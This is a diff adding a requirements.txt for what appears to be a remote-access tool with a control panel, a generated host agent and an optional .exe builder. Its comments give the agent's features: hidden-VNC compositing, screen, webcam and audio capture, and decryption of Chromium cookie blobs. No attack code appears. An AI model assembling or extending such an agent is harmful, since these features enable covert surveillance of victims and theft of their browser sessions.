@@ -1,0 +1,20 @@
+# The panel server itself is pure standard library. Everything below is used by
+# the generated agent on the host, so install it once before building:
+#
+#   python -m pip install -r requirements.txt
+#
+# The agent degrades gracefully: a module whose dependency is missing returns a
+# clear error instead of crashing the session.
+
+psutil>=5.9            # processes, connections, sysinfo, disk
+mss>=9.0               # screen capture
+Pillow>=10.0           # JPEG encoding, HVNC compositing
+numpy>=1.26            # audio buffers for the WASAPI capture workers
+opencv-python>=4.9     # webcam capture (DirectShow)
+pycryptodome>=3.20     # AES-GCM for Chromium v10/v11 cookie blobs
+
+# Audio capture is implemented against WASAPI through ctypes, so no extra
+# audio package is required.
+
+# Optional: only needed when the builder is asked for a native .exe.
+# pyinstaller>=6.0
